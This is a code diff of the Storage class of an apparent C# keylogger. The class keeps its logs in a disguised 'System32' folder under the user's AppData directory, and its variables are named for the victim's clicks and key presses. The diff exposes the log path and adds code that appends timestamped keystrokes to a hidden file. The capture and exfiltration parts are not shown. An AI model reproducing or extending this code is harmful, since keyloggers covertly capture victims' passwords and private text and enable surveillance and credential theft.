@@ -3,7 +3,7 @@
     internal class Storage
     {
         private static string AppDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32";
-        private static string BaseKeylogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\";
+        public static string BaseKeylogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\";
         private static string AllVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\AllClicks.txt";
         private static string OnlyKeyPressVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\OnlyKeyPressClicks.txt";
         internal Storage()
@@ -26,7 +26,7 @@
         }
         public static void SaveOnlyKeyPressLog(string content)
         {
-
+            File.AppendAllLines(OnlyKeyPressVictimClicks, new[] { $"{DateTime.Now}: {content}" });
         }
     }
 }
